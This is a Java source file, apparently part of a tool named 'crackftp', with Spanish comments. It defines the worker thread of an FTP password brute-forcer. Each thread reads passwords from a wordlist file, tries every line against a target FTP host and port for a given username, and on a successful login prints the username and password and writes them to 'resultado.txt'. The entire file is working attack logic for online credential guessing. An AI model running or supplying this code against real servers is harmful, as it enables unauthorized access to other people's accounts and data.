/*
 Esta clase tiene el comportamiento de cada hilo
 */
package crackftp;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Hilo implements Runnable{
    
    private String usuario;
    private BufferedReader claves;
    private String direccion;
    private String puerto;
    private GestorHilos gestor;
    
    public Hilo(String usuario, String fclaves, String d, String p, GestorHilos gh){
        this.usuario = usuario;
        this.direccion = d;
        this.puerto = p;
        this.gestor = gh;
        try {
            this.claves = new BufferedReader(new FileReader(fclaves));
        } catch (FileNotFoundException ex) {
            System.out.println("No se ha encontrado el fichero indicado");
            Logger.getLogger(Hilo.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    
    // Metodo run al que llamaremos para realizar las comprobaciones de las diferentes claves
    @Override
    public void run() {
        
        
        try {
            String linea = "";
            while((linea = this.claves.readLine()) != null){
                Ftp f = new Ftp(this.usuario, linea, this.direccion, this.puerto);
                if(f.autenticar()){
                    //imprimimos el usuario y contraseña por patanlla y lo metemos en un fichero
                    System.out.println("Usuario encontrado: \n"
                            + " usuario: " + this.usuario + "pass: " + linea );
                    String nuevaLinea = "usuario: " + this.usuario + ", pass" + linea;
                   FicheroResultado fr = new FicheroResultado("resultado.txt", nuevaLinea);
                   fr.escribirLinea();
                    break;
                }
                f.cerrarConexion();
            }
            
            
        } catch (IOException ex) {
            Logger.getLogger(Hilo.class.getName()).log(Level.SEVERE, null, ex);
        }finally{
            
            this.gestor.quitarHilo(this);
            this.gestor.desbloquearHilos();
            
            if(this.claves != null){
                try {
                    this.claves.close();
                } catch (IOException ex) {
                    Logger.getLogger(Hilo.class.getName()).log(Level.SEVERE, null, ex);
                }
            }       
        }
    }
}
